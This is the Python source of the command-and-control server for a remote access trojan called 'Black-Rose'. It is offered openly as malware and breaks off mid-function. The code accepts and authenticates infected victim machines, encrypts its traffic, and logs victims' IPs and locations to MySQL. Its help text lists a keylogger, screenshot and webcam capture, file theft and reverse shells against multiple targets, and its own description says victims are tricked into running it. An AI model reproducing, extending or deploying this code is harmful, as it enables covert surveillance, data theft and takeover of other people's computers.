#! /usr/bin/python

#  Black-Rose is a cross platform python remote access torjan
#  which allows you to access the command line of windows and 
#  linux series with unicast, multicast and broadcast methods.

# Coded-by: Sha2ow_M4st3r


# Importing the requirement modules
import platform
import colorama
import ctypes
import sys
import os

from termcolor import colored

# Making ANSI color
colorama.init()

# Before of everything we need to make sure that the Black-Rose is launched in root mode or not
if "Linux" in platform.platform():
    if os.getuid() != 0:
        print colored("[Black-Rose]>", "yellow"), colored("Sorry, You must run me in root mode.", "white")
        sys.exit()
elif "Windows" in platform.platform():
    if ctypes.windll.shell32.IsUserAnAdmin() != 1:
        print colored("[Black-Rose]>", "yellow"), colored("Sorry, You must run me in administrator mode.", "white")  
        sys.exit()
else:
    colored("[Black-Rose]>", "yellow"), colored("Sorry, Operating system not defined.", "white")
    sys.exit()



# Importing modules
try:
    # Importing base modules
    import subprocess
    import threading
    import netifaces
    import MySQLdb
    import urllib2
    import getpass
    import socket
    import Queue
    import time
    import json

    # Importing cryptography modules
    import hashlib
    import base64
    import hmac
    import uuid

    from Crypto.Cipher import AES

    from prettytable import PrettyTable

except ImportError as MSG:
    print colored("[Black-Rose]>", "yellow"), colored("Error in importing module:", "white"), colored(MSG, "white")
    sys.exit()


# Some global variables
THREAD_NUMBERS = 2
PLATFORM = platform.platform()
QUEUE = Queue.Queue()
Time = time.asctime()

# Global variables for client/server authentication
Server_USERID = uuid.uuid4().hex
Server_NONCE = base64.b64encode(os.urandom(16)) # 16 Bytes : 128 Bits (Random)

# Global structures
ALL_CONNECTIONS = []
ALL_ADDRESSES = []
ALL_ADDRESSES_ADDED = []
ALL_PLATFORMS = []
ALL_DISTS = []
ALL_PLATFORMS_ARCH = []
ALL_USER_ACCOUNTS = []
ALL_LATITUDE_LONGITUDE = []
ALL_PUBLIC_IP = []
ALL_COUNTRYS = []
ALL_CITYS = []

JOBS_NUMBER = [1, 2]


# Logging all events
def Logger(Log):
    try:
        if "Linux" in PLATFORM:
            File = open(os.getcwd() + "/Black-Rose-Log.txt", "a")
            File.write("[" + Time + "]" + "> " + Log)
            File.close()

            # Back to main
            return
        elif "Windows" in PLATFORM:
            File = open(os.getcwd() + r"\Black-Rose-Log.txt", "a")
            File.write("[" + Time + "]" + "> " + Log)
            File.close()

            # Back to main
            return
        else:
            print colored("[ERROR]>", "red"), colored("Sorry, Operating system not defined.", "white")
            sys.exit()
    except IOError:
        print colored("[ERROR]>", "red"), colored("The Logger function can not open log file correctly.")
        sys.exit()
    except:
        print colored("[ERROR]>", "red"), colored("The Logger function can not work properly.")
        sys.exit()



# +-------------------+
# | Dispaly functions |
# +-------------------+

# Authentication banner
def A_BANNER():
    print colored("      _   _", "yellow")
    print colored(" ___ (~ )( ~)", "yellow"), " ",  colored(" To follow the path", "white")
    print colored(r"/   \_\ \/ /", "yellow"),   "   ",  colored("Look to the MASTER", "white")
    print colored(r"|   D_ ]\ \/", "yellow"),   "   ",  colored("Follow the MASTER", "white")
    print colored(r"|   D _]/\ \ ", "yellow"),  "  ",  colored("Walk with the MASTER","white")
    print colored(r"\___/ / /\ \ ", "yellow"),  "  ",  colored("See through the MASTER", "white")
    print colored("    (_ )  ( _)", "yellow"), " ",  colored("Become the MASTER", "white")

    print colored("\n[Black-Rose]:", "magenta"), colored("is a Python RAT", "white")
    print colored("[Coded-by]:", "magenta"),  colored("Sha2ow_M4st3r", "white")
    print colored("[Contact]:", "magenta"), colored("Sha2ow@protonmail.com", "white")
    print colored("[Github]:", "magenta"), colored("https://github.com/Sha2ow-M4st3r\n", "white")



# Black-Rose banner
def B_BANNER():
    print colored("        .---.        .-----------", "magenta")
    print colored(r"      /     \  __  /    ------", "magenta"), colored("I have learned things in the dark that I could never have learned in the light,", "white")
    print colored(r"     / /     \(..)/    -----", "magenta"), colored("  Things that have saved my life over and over again,", "white")
    print colored(r"    //////   ' \/ `   ---", "magenta"), colored("     So that there is really only one logical conclusion.", "white")
    print colored("    //// / // :    : ---", "magenta"), colored("      I need darkness as much as I need light.", "white")
    print colored("   // /   /  /`    '--", "magenta")
    print colored("  //          //..\\", "magenta"), "   " ,colored("\t[Black-Rose]:", "green"), colored("is a Python RAT", "white")
    print colored("         ====UU====UU====", "red"), colored("\t[Coded-by]:", "green"),  colored("Sha2ow_M4st3r", "white")
    print colored("             '//||\\`", "magenta"), colored("\t\t[Contact]:", "green"), colored("Sha2ow@protonmail.com", "white")
    print colored("               ''``", "magenta"), colored("\t\t[Github]:", "green"), colored("https://github.com/Sha2ow-M4st3r", "white")
    print colored("        Live in brightness", "yellow")
    print colored("        Fight in the shadow", "grey")
    print "\n"



# About the Black-Rose and his author (Yes, I'm a man :D)    
def About_ME():
    print "\n"
    print" _________________________________________"
    print"/  A remote administration tool (RAT) is a\\"
    print"| programmed tool that allows a remote    |"
    print"| device to control a system like the have|"
    print"| physical access to that system. Users   |"
    print"| are typically tricked by some form of   |"
    print"| social engineering into loading and     |"
    print r"\ executing rat on their systems.         /"
    print" -----------------------------------------"
    print r"        \   ^__^"
    print r"         \  (oo)\_______"
    print r"            (__)\       )\/\""
    print"                ||----w |"
    print"                ||     || ( Im a cow not rat :| )"



    print colored("\n[Black-Rose]:", "yellow"), colored("is a Python RAT", "white")
    print colored("[Coded-by]:", "yellow"),  colored("Sha2ow_M4st3r", "white")
    print colored("[Contact]:", "yellow"), colored("Sha2ow@protonmail.com", "white")
    print colored("[Github]:", "yellow"), colored("https://github.com/Sha2ow-M4st3r\n", "white")

    print colored("The script features are as follows:", "cyan")
    print colored("-----------------------------------\n", "cyan")

    print colored("[+] Multi-threading", "white")
    print colored("[+] Error-handling", "white")
    print colored("[+] Keylogger", "white")
    print colored("[+] Screenshot", "white")
    print colored("[+] Webcam-snapshot", "white")
    print colored("[+] Download/Upload file", "white")
    print colored("[+] Reporting.", "white")
    print colored("[+] Reverse shell with [Unicast/Multicast/Broadcast] addressing", "white")
    print colored("[+] Works with MySQL database", "white")
    print colored("[+] See a list of connected targets.", "white")
    print colored("[+] View a list of connected targets information.", "white")
    print colored("[+] Scan famous ports of protocols (You can add another port to the list).\n", "white")


    print colored("[Python-version]:", "yellow"), colored("2.7", "white")
    print colored("[Tested-on]:", "yellow"), colored("Windows and linux series", "white")
    print colored("[Form-author]:", "yellow"), colored("You Can't Run From Your Shadow. But You Can Invite It To Dance\n", "white")



# Commands
def Help():
    print "\n"
    print colored("Commands                       Description", "yellow")                                               
    print colored("---------                      -----------------------------------------------", "white")        
    print colored("help or ?                      Show this message.", "white")                                       
    print colored("show info                      Show all connected targets information.", "white")                 
    print colored("show list                      Show all connected targets.", "white")     
    print colored("show sysinfo                   Show system information.", "white")     
    print colored("show interfaces                Show all connected interfaces information.", "white") 
    print colored("show database                  Show all stored data in mysql database.", "white")                        
    print colored("about                          What is Black-Rose and who is the author of it.", "white")                      
    print colored("save                           Store data in mysql database.", "white")              
    print colored("clear                          Fresh terminal.", "white")               
    print colored("select                         Reverse shell with unicast addressing.", "white")
    print colored("range                          Reverse shell with multicast addressing.", "white") 
    print colored("broadcast                      Reverse shell with broadcast addressing.", "white")
    print colored("download                       Download file from target system.", "white")
    print colored("upload                         File upload to victim system.", "white")
    print colored("keylogger                      Launch Keylogging.", "white")
    print colored("screenshot                     Take screenshot.", "white")
    print colored("webcapture                     Take picture with target webcam.", "white")


    print colored("\nExamples:", "yellow")
    print colored("---------", "white")
    print colored("select   <Index-number>", "white")
    print colored("range    <Index-number <Space> <Index-number>", "white")
    print colored("download <Filename-path>", "white")
    print colored("upload   <Filename-path>", "white")


    print colored("\nNotes:", "yellow")
    print colored("------", "white")
    print colored("[1]. The keylogging operation ends when your target presses the end button,", "white") 
    print colored("     then you can download the corresponding file from the target system.", "white")
    print colored("     End button means: (` and 0)", "white")

    print colored("[2]. After the 'Screenshot' operation, you must download the file from the target machine.", "white")
    print colored("[3]. Webcapture or Webcam capture only work on linux platforms.", "white")
    print colored("[4]. These cases: Screenshot and webcam capture should be run in the Unicast, Multicast, and broadcast sections.", "white")
    print colored("[5]. Keylogger only work in unicast addressing method.", "white")



# Clean terminal
def Clear_DISPLAY():
    if "Linux" in platform.platform():
        subprocess.call("clear", shell=True)
    elif "Windows" in platform.platform():
        subprocess.call("cls", shell=True)



# +-------------------------------+
# | User authentication functions |
# +-------------------------------+

# Starting MySQL connection
def MySQL_CONNECTION(IP_Address, DB_User, DB_Pass, DB_Name):
    global MySQL_DB

    try:
        # Open database connection
        MySQL_DB = MySQLdb.connect(IP_Address, DB_User, DB_Pass, DB_Name)
        print colored("[MESSAGE]>", "grey"), colored("MySQL connection", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("ACTIVATED", "green"), colored("]", "white")
        Logger("MySQL connection was created successfully.\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL connection", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Logger("MySQL connection creation was failed.\n")
        Logger("Script stopped.\n")
        sys.exit()



# Prepare cursor
def MySQL_CURSOR():
    global Cursor

    try:
        # Prepare a cursor object using cursor() method
        Cursor = MySQL_DB.cursor()
        print colored("[MESSAGE]>", "grey"), colored("MySQL cursor", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("CREATED", "green"), colored("]", "white")
        Logger("MySQL cursor was prepared successfully.\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL curosr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "green"), colored("]", "white")
        Logger("MMySQL cursor creation was failed.\n")
        Logger("Script stopped.\n")
        MySQL_DB.close()
        sys.exit()



# User authentication
def User_AUTHENTICATION():
    while True:
        # Checking username and password
        Username = raw_input(colored("\n[Username@Black-Rose]> ", "green"))
        if len(Username) == 0 or Username == " ":
            print colored("[WARNING]>", "yellow"), colored("Please enter your username.", "white")
            Logger("[USER-AUTHENTICATION]> Username in user authentication mode not found.\n")
            continue

        Password = raw_input(colored("[Passwrod@Black-Rose]> ", "green"))
        if len(Password) == 0 or Password == " ":
            print colored("[WARNING]>", "yellow"), colored("Please enter your password.", "white")
            Logger("[USER-AUTHENTICATION]> Password in user authentication mode not found.\n")
            continue
        
        Hashed_PASSWORD = hashlib.sha256(Password).hexdigest()

        # Authentication
        try:
            # Execute SQL query using execute() method
            Cursor.execute("SELECT * FROM pocket")
            # Save fetchall result
            UserDATA = Cursor.fetchall()
            print colored("\n[MESSAGE]>", "grey"), colored("Reading user data", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("DONE", "green"), colored("]", "white")
            Logger("[USER-AUTHENTICATION]> Reading user data from MySQL database was successfully.\n")
        except:
            print colored("\n[MESSAGE]>", "grey"), colored("Reading user data", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
            Logger("[USER-AUTHENTICATION]> Reading user data from MySQL database was failed.\n")
            break
        if Username == UserDATA[0][0] and Hashed_PASSWORD == UserDATA[0][1]:
            print colored("[MESSAGE]>", "grey"), colored("Authentication", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
            Logger("[USER-AUTHENTICATION]> User was authenticated successfully.\n")
            break
        else:
            print colored("[MESSAGE]>", "grey"), colored("Authentication", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
            Logger("[USER-AUTHENTICATION]> User authentication was failed.\n")
            Logger("Script stopped.\n")
            Cursor.close()
            MySQL_DB.close()
            sys.exit()

    
    # Export keys (IV, AES key, Secret key)
    try:
        # Execute SQL query using execute() method
        Cursor.execute("SELECT IV, AES_KEY, Secret FROM pocket")
        # Save fetchall result
        UserDATA = Cursor.fetchall()

        # Copy data on file
        try:
            File = open(os.getcwd() + "/Keys.txt", "a")
            File.write("[Initialization_vector]> " + str(UserDATA[0][0]) + "\n")
            File.write("[Secret_KEY]> " + str(UserDATA[0][2]) + "\n")
            File.write("[AES_KEY]> " + str(UserDATA[0][1]) + "\n")
            File.write("* The keys are encrypted by the base64 algorithm. (Decode it)")
            File.close()

            print colored("[STATUS]>", "blue"), colored("Keys file", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("EXPORTED", "green"), colored("]\n", "white")
            print colored("[NOTE]>", "yellow"), colored("Put keys in rose part.", "white")
            print colored("[NOTE]>", "yellow"), colored("Remove keys file.\n")
            Logger("[USER-AUTHENTICATION]> Keys file was successfully exported\n")

        except IOError:
            print colored("[STATUS]>", "blue"), colored("Keys file", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("NOT EXPORTED", "red"), colored("]\n", "white")
            Logger("[USER-AUTHENTICATION]> Keys file was not exported.\n")
            Logger("Script stopped.\n")
            Cursor.close()
            MySQL_DB.close()
            sys.exit()

        # Create MySQL table
        MySQL_TABLE_CHECK()



        raw_input(colored("\nPress enter...", "cyan"))
        Clear_DISPLAY()
        B_BANNER()
    except:
        print colored("\n[MESSAGE]>", "grey"), colored("Reading keys", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Logger("[USER-AUTHENTICATION]> Can't read keys from database.\n")
        Logger("Script stopped.\n")
        Cursor.close()
        MySQL_DB.close()
        sys.exit()



# +------------------------------+
# | System information functions |
# +------------------------------+

# Getting information from all network interfaces
def Network_IFACE_INFORMATION():
    Iface_COUNTER = 1
    # Finding interfaces
    Interfaces = []
    for Iface in netifaces.interfaces():
        if Iface.encode("UTF-8") == "l0" or Iface.encode("UTF-8") == "lo":
            continue
        Interfaces.append(Iface.encode("UTF-8"))

    # Show info
    print colored("[STATUS>]", "blue"), colored("Some information about your network interfaces\n", "white")
    for Iface in Interfaces:
        Addr = netifaces.ifaddresses(Iface)

        if "Linux" in PLATFORM:
            print colored("+" + "-" * 36 + "|", "yellow"), colored("Interface ", "grey"), colored("|" + "-" * 36 + "+", "yellow")
            print colored("Interface", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Iface, "green"), colored("]", "white")
            print colored("Mac--Addr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[netifaces.AF_LINK][0]['addr'].encode("UTF-8"), "green"), colored("]", "white")
            print colored("IP---Addr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[netifaces.AF_INET][0]['addr'].encode("UTF-8"), "green"), colored("]", "white")
            print colored("Mask-Addr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[netifaces.AF_INET][0]['netmask'].encode("UTF-8"), "green"), colored("]", "white")
            print colored("Broadcast", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[netifaces.AF_INET][0]['broadcast'].encode("UTF-8"), "green"), colored("]", "white")
            Iface_COUNTER += 1
            print "\n"
        
        if "Windows" in PLATFORM:
            print colored("+" + "-" * 36 + "|", "yellow"), colored("Interface " + str(Iface_COUNTER), "grey"), colored("|" + "-" * 36 + "+" + "\n", "yellow")
            print colored("Interface", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Iface, "green"), colored("]", "white")
            print colored("Mac--Addr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[Addr.keys()[0]][0]['addr'].encode("UTF-8"), "green"), colored("]", "white")
            print colored("IP---Addr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[Addr.keys()[1]][0]['addr'].encode("UTF-8"), "green"), colored("]", "white")
            print colored("Mask-Addr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[Addr.keys()[1]][0]['netmask'].encode("UTF-8"), "green"), colored("]", "white")
            print colored("Broadcast", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Addr[Addr.keys()[1]][0]['broadcast'].encode("UTF-8"), "green"), colored("]", "white")
            Iface_COUNTER += 1
            print "\n"
        


# Getting information from current user and operating system
def System_INFORMATION():
    Platform_INFO = platform.uname()

    print colored("[STATUS]>", "blue"), colored("Some information about your machine\n", "white")
    print colored("[MESSAGE]>", "grey"), colored("Platform", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Platform_INFO[0], "green"), colored("]", "white")
    print colored("[MESSAGE]>", "grey"), colored("Release", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Platform_INFO[2], "green"), colored("]", "white")
    print colored("[MESSAGE]>", "grey"), colored("Architecture", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored(Platform_INFO[4], "green"), colored("]", "white")
    print colored("[MESSAGE]>", "grey"), colored("Version", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Platform_INFO[3], "green"), colored("]", "white")
    print colored("[MESSAGE]>", "grey"), colored("Hostname", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Platform_INFO[1], "green"), colored("]", "white")
    print colored("[MESSAGE]>", "grey"), colored("Current-user", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored(getpass.getuser(), "green"), colored("]", "white")
    print colored("[MESSAGE]>", "grey"), colored("Processor", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Platform_INFO[5], "green"), colored("]", "white")
    print colored("[MESSAGE]>", "grey"), colored("Python version", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored(platform.python_version(), "green"), colored("]", "white")
    print "\n"



# +----------------------+
# | Connection functions |
# +----------------------+ 

# Checking internet connection
def Eyes_OF_CONNECTION():
    URL = "https://www.google.com"

    try:
        # Online part
        urllib2.urlopen(URL, timeout=2)
        print colored("\n[STATUS]>", "blue"), colored("Checking internet connection...\n", "yellow")
        print colored("[MESSAGE]>", "grey"), colored("Internet connection", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("ONLINE", "green"), colored("]", "white")
        Logger("Internet connection status: ONLINE\n")
    except:
        # Offline part
        print colored("\n[STATUS]>", "blue"), colored("Checking internet connection...\n", "yellow")
        print colored("[MESSAGE]>", "grey"), colored("Internet connection", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("OFFLINE", "red"), colored("]", "white")
        Logger("Internet connection status: OFFLINE\n")
        print colored("[MESSAGE]>", "grey"), colored("Waiting for internet connection...", "white")
        Logger("Waiting for internet connection...\n")
        Timer() 



# Periodically
def Timer():
    Now_TIME = time.time()
    Period = 10 # Second

    while True:
        time.sleep(Period)
        if time.time() > Now_TIME:
            Eyes_OF_CONNECTION()
            break         



# +------------------+
# | Socket functions |
# +------------------+

# Create a socket to create connection between clients and server
def Socket_CREATION():
    global SCT

    try:
        # Using TCP and IPv4 protocol
        SCT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # # The SO_REUSEADDR flag tells the kernel to reuse a local socket in TIME_WAIT state, without waiting for its natural timeout to expire.
        SCT.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print colored("[MESSAGE]>", "grey"), colored("Socket creation", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
        Logger("Socket was created successfully.\n")
    except socket.error as MSG:
        print colored("[MESSAGE]>", "grey"), colored("Socket creation", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Logger("Socket creation was failed.\n")
        Logger("Reason: " + str(MSG) + ".\n")
        Logger("Script stopped.\n")
        Cursor.close()
        MySQL_DB.close()
        sys.exit()



# Binding
def Socket_BIND(HOST, PORT):
    try:
        SCT.bind((HOST, PORT))
        SCT.listen(5)
        print colored("[MESSAGE]>", "grey"), colored("Binding on socket", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
        print "\n"
        Logger("Socket was binded successfully.\n")
    except socket.error as MSG:
        print colored("[MESSAGE]>", "grey"), colored("Binding on socket", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Logger("Socket binding status: Failed.\n")
        Logger("Reason: " + str(MSG) + ".\n")
        Logger("Script stopped.\n")
        Cursor.close()
        MySQL_DB.close()
        sys.exit()



# Established the connection
def Socket_ACCEPT():
    # Closing all previously saved connections
    for Connections in ALL_CONNECTIONS:
        Connections.close()
    
    del ALL_CONNECTIONS[:]
    del ALL_ADDRESSES[:]

    # Accepting connections from multiple clients
    while True:
        try:
            Logger("Waiting for client connection...\n")
            Connection, Client_INFO = SCT.accept()
            Logger("Client was successfully connected to server. " + str(Client_INFO) + "\n")
        except socket.error as MSG:
            print colored("[ERROR]>", "red"), colored("Can not accepting client connection.", "white")
            Logger("Can not accepting client connection.\n")
            Logger("Reason: " + str(MSG) + ".\n")
        
        print colored("\n[MESSAGE]>", "grey"), colored("Client was successfully connected to server. " + str(Client_INFO) + "\n")
        
        # Authenticate
        CHAP(Client_INFO, Connection)



# +--------------------------+
# | Authentication functions |
# +--------------------------+

# Client/Server authentication (Challenge and response protocol)
def CHAP(Client_INFO, Client_CONNECTION):
    # +-----------------------------------+
    # | Server authentication for clients |
    # +-----------------------------------+

    print colored("+" + "-" * 20 + "|", "yellow"), colored("Server Authentication for client", "magenta"), colored("|" + "-" * 20 + "+", "yellow")

    # Sending server user id
    try:
        Client_CONNECTION.send(Server_USERID)
        print colored("[MESSAGE]>", "grey"), colored("Server user id status", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("SENT", "green"), colored("]", "white")
        Logger("Server user id was sent.\n")
    except socket.error as MSG:
        print colored("[MESSAGE]>", "grey"), colored("Server user id status", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("NOT SENT", "red"), colored("]", "white")
        Logger("Server user id can not send.\n")
        Logger("Reason: " + str(MSG) + ".\n")
        Client_CONNECTION.close()
        return
    
    # Receive 24 bits nonce from client
    try:
        Client_NONCE = Client_CONNECTION.recv(24)

        if len(Client_NONCE) == 24:
            print colored("[MESSAGE]>", "grey"), colored("Client nonce status", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("RECEIVED", "green"), colored("]", "white")
            Logger("Server was received 24 bits nonce from client.\n")
        else:
            print colored("[MESSAGE]>", "grey"), colored("Client nonce status", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT RECEIVED", "red"), colored("]", "white")
            Logger("Client nonce was received, but nonce length was litten than 24 bits.\n")
            Client_CONNECTION.close()
            return
    except socket.error as MSG:
        print colored("[ERROR]>", "red"), colored("Server can not received nonce from client.", "white")
        Logger("Server can not received nonce from client.\n")
        Client_CONNECTION.close()
        return
    
    # Get the secret key from the database
    try:
        # Execute SQL query using execute() method
        Cursor.execute("SELECT Secret from pocket")
        # Save fetchall result
        UserDATA = Cursor.fetchall()
        Shared_SECRET_KEY = UserDATA[0][0]
        print colored("[MESSAGE]>", "grey"), colored("Reading shared secret key", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
        Logger("Reading shared secret key from MySQL database was successfully.\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("Reading shared secret key", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Logger("Reading shared secret key from MySQL database was failed.\n")
        Client_CONNECTION.close()
        return

    try:
        # Create challenge response
        Challenge_RESPONSE = hmac.new(Shared_SECRET_KEY, Client_NONCE, hashlib.sha256)
        print colored("[MESSAGE]>", "grey"), colored("Challenge response creation", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
        Logger("Challenge response creation was successfully.\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("Challenge response creation", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Logger("Challenge response creation was failed.\n")
        Client_CONNECTION.close()
        return

    # Sending challenge response
    try:
        Client_CONNECTION.send(Challenge_RESPONSE.hexdigest())
        print colored("[MESSAGE]>", "grey"), colored("Challenge response", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("SENT", "green"), colored("]", "white")
        Logger("Challenge response was sent successfully.\n")
    except socket.error as MSG:
        print colored("[MESSAGE]>", "grey"), colored("Challenge response", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT SENT", "red"), colored("]", "white")
        Logger("Challenge response was failed.\n")
        Client_CONNECTION.close()
        return

    # Getting feedback flag
    try:
        Result = Client_CONNECTION.recv(1)
        if Result == "T":
            print colored("[SUCCESS]>", "green"), colored("Server was authenticated for client.\n", "white")
            Logger("Server was authenticated for client.\n")
        elif Result == "F":
            print colored("[WARNING]>", "yellow"), colored("The server is not authenticated for the client.", "white")
            Logger("The server is not authenticated for the client.\n")
            Client_CONNECTION.close()
            return
    except socket.error as MSG:
        print colored("[ERROR]>", "red"), colored("Server can not recived result flag.")
        Logger("Server can not recived result flag.")
        Client_CONNECTION.close()
        return


    # +-----------------------------------+
    # | Authentication Clients for server |
    # +-----------------------------------+

    print colored("+" + "-" * 20 + "|", "yellow"), colored("Client authentication for server", "magenta"), colored("|" + "-" * 20 + "+", "yellow")

    # Sending server nonce
    try:
        Client_CONNECTION.send(Server_NONCE)
        print colored("[MESSAGE]>", "grey"), colored("Server nonce", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("SENT", "green"), colored("]", "white")
        Logger("Server nonce was sent sucessfully.\n")
    except socket.error as MSG:
        print colored("[MESSAGE]>", "grey"), colored("Server nonce", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT SENT", "red"), colored("]", "white")
        Logger("Server nonce cannot be sent.\n")
        Logger("Reason: " + str(MSG) + ".\n")
        Client_CONNECTION.close()
        return
    
    # Calculate hmac for self
    Self_CAL = hmac.new(Shared_SECRET_KEY, Server_NONCE, hashlib.sha256)
    Logger("Hmac calculation was successfully completed.\n")

    # Received client response
    try:
        Client_RESPONSE = Client_CONNECTION.recv(64)
        if len(Client_RESPONSE) == 64:
            print colored("[MESSAGE]>", "grey"), colored("Client response", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("RECEIVED", "green"), colored("]", "white")
        else:
            print colored("[MESSAGE]>", "grey"), colored("Client response", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT RECEIVED", "red"), colored("]", "white")
            print colored("[WARNING]>", "yellow"), colored("Client was not authenticated\n", "white")
            Logger("Client was not authenticated.\n")
            Logger("Client nonce response was received, but result length was litten than 24 bits.\n")
            Client_CONNECTION.close()
            return
    except socket.error as MSG:
        print colored("[ERROR]>", "red"), colored("Server cannot receive any response from client.", "white")
        Logger("Server cannot receive any response from client.\n")
        Client_CONNECTION.close()
        return
    
    # Check Self hmac and client response
    if Self_CAL.hexdigest() == Client_RESPONSE:
        print colored("[SUCCESS]>", "green"), colored("Client was authenticated successfully.\n", "white")
        Logger("Client was authenticated successfully.\n")
        
        # Save authenticated client data
        ALL_CONNECTIONS.append(Client_CONNECTION)
        ALL_ADDRESSES.append(Client_INFO)

        print colored("[MESSAGE]>", "grey"), colored("Client data was successfully saved\n", "white")
        Logger("Client data was successfully saved " + str(Client_INFO) + ".\n")
        
        Receive_TARGET_INFO(Client_CONNECTION, Client_INFO)

    else:
        print colored("[WARNING]>", "yellow"), colored("Client was not authenticated.\n", "white")
        Logger("Client was not authenticated.\n")
        Client_CONNECTION.close()
        return



# +------------------------+
# | Cryptography functions |
# +------------------------+

# Making cipher
def Cipher():
    global AES_CIPHER
    # Get the AES requiremnets from the database
    try:
        # Execute SQL query using execute() method
        Cursor.execute("SELECT IV, AES_KEY FROM pocket")
        # Save fetchall result
        UserDATA = Cursor.fetchall()
        Initialization_Vector = base64.b64decode(UserDATA[0][0])
        AES_KEY = base64.b64decode(UserDATA[0][1])
        print colored("[MESSAGE]>", "grey"), colored("Reading AES requirements", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
        Logger("Reading AES requirements from MySQL database was successfully.\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("Reading AES requirements", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Logger("Reading AES requirements from MySQL database was failed.\n")
        Logger("Script stopped.\n")
        Cursor.close()
        MySQL_DB.close()
        sys.exit()
    
    try:
        AES_CIPHER = AES.AESCipher(AES_KEY, AES.MODE_CFB, Initialization_Vector)
        print colored("[MESSAGE]>", "grey"), colored("AES cipher", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("CREATED", "green"), colored("]", "white")
        Logger("AES cipher was created sucessfully.\n")
    except:
        print colored("[MESSAGE]>", "grey"), colored("AES cipher", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("NOT CREATED", "red"), colored("]", "white")
        Logger("AES cipher creation was failed.\n")
        Logger("Script stopped.\n")
        Cursor.close()
        MySQL_DB.close()
        sys.exit()


    
# Encrypt data
def Encryption(Plain_TEXT):
    try:
        Encrypted_DATA = AES_CIPHER.encrypt(Plain_TEXT)
        Logger("Data was encrypted successfully.\n")
        return Encrypted_DATA
    except:
        Logger("Data encryption was failed.\n")



# Decrypt data
def Decryption(Encrypted_TEXT):
    try:
        Decrypted_DATA = AES_CIPHER.decrypt(Encrypted_TEXT)
        Logger("Data was decrypted successfully.\n")
        return Decrypted_DATA
    except:
            Logger("Data decryption was failed.\n")



# +-------------------------------+
# | Targets information functions |
# +-------------------------------+

# Receiving targets information in json format
def Receive_TARGET_INFO(Client_CONNECTION, Client_INFO):
    b = b''

    try:
        Tmp = Client_CONNECTION.recv(4096)
        b += Tmp
        Load_DATA = json.loads(b)
        print colored("[MESSAGE]>", "grey"), colored("Client information", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("RECEIVED", "green"), colored("]", "white")
    except:
